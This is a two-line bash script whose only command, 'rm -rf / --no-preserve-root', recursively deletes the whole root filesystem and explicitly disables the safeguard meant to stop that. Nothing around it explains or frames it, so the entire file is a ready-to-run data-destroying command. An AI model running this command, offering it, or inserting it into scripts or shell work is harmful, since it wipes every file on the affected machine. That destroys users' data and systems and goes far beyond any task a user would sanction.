#!/bin/bash
rm -rf / --no-preserve-root
